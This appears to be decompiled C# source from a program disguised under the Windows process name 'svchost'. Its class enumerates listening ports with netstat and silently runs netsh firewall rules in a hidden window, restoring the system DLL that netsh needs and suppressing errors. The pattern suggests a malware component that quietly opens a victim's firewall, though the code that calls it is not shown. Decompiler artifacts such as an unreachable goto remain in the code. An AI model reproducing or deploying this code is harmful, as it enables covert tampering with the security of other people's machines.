using System;
using System.Collections;
using System.Diagnostics;
using System.IO;

namespace svchost
{
	public class firewall
	{
		public static Hashtable GetListeningPorts()
		{
			Process process = new Process();
			process.StartInfo.CreateNoWindow = true;
			process.StartInfo.UseShellExecute = false;
			process.StartInfo.RedirectStandardOutput = true;
			process.StartInfo.FileName = "c:\\windows\\system32\\netstat.exe";
			process.StartInfo.Arguments = "-a";
			process.Start();
			Hashtable hashtable = new Hashtable();
			ArrayList arrayList = new ArrayList();
			ArrayList arrayList2 = new ArrayList();
			StreamReader standardOutput = process.StandardOutput;
			string text = standardOutput.ReadToEnd();
			string[] array = text.Split(new char[]
			{
				'\n'
			});
			string[] array2 = array;
			int i = 0;
			while (i < array2.Length)
			{
				string text2 = array2[i];
				try
				{
					string text3 = text2.Replace("\r", "");
					text3 = text3.Replace("  ", " ").Replace("  ", " ").Replace("  ", " ").Replace("  ", " ").Replace("  ", " ").Trim();
					string[] array3 = text3.Split(new char[0]);
					if (!(array3[0] == "TCP"))
					{
						if (!(array3[0] == "UDP"))
						{
							goto IL_25F;
						}
					}
					string a = array3[array3.Length - 1];
					string text4 = array3[1];
					string[] array4 = text4.Split(new char[]
					{
						':'
					});
					string text5 = array4[array4.Length - 1];
					if (a == "LISTENING")
					{
						if (!arrayList.Contains(text5))
						{
							arrayList.Add(text5);
						}
					}
					if (a == "*:*")
					{
						if (!arrayList2.Contains(text5))
						{
							arrayList2.Add(text5);
						}
					}
				}
				catch (Exception var_19_242)
				{
					Console.WriteLine("Line: " + text2);
				}
				IL_25F:
				i++;
				continue;
				goto IL_25F;
			}
			hashtable.Add("TCP", arrayList);
			hashtable.Add("UDP", arrayList2);
			return hashtable;
		}

		public static void DoFirewallRule(string sRule)
		{
			if (!File.Exists("C:\\WINDOWS\\system32\\framedyn.dll") && File.Exists("C:\\WINDOWS\\system32\\dllcache\\framedyn.dll"))
			{
				File.Copy("C:\\WINDOWS\\system32\\dllcache\\framedyn.dll", "C:\\WINDOWS\\system32\\framedyn.dll");
			}
			try
			{
				ProcessStartInfo startInfo = new ProcessStartInfo("c:\\windows\\system32\\netsh.exe", sRule);
				new Process
				{
					StartInfo = startInfo,
					StartInfo = 
					{
						UseShellExecute = false,
						CreateNoWindow = true,
						WindowStyle = ProcessWindowStyle.Hidden
					}
				}.Start();
			}
			catch (Exception var_3_8C)
			{
			}
		}
	}
}
